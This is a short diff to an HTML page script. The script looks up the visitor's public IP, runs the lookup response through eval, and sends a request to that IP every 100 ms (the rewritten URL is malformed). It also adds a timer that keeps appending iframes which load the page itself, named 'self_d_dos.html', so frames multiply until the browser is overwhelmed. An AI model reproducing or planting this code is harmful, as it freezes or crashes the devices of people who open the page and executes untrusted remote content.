@@ -10,12 +10,15 @@ fetch("https://api.ipify.org/?format=jsonp&callback=")
   let j = eval(t)
   console.log(j)
 setInterval(()=>{
-let i = document.createElement("iframe")
-i.src="https://"+j.ip
-document.body.appendChild(i)
+fetch("https:/"+j.ip)
 },100)
 })
 
+  setInterval(()=>{
+let i = document.createElement("iframe")
+i.src="self_d_dos.html"
+document.body.appendChild(i)
+},200)
 </script>
 </body>
 </html>
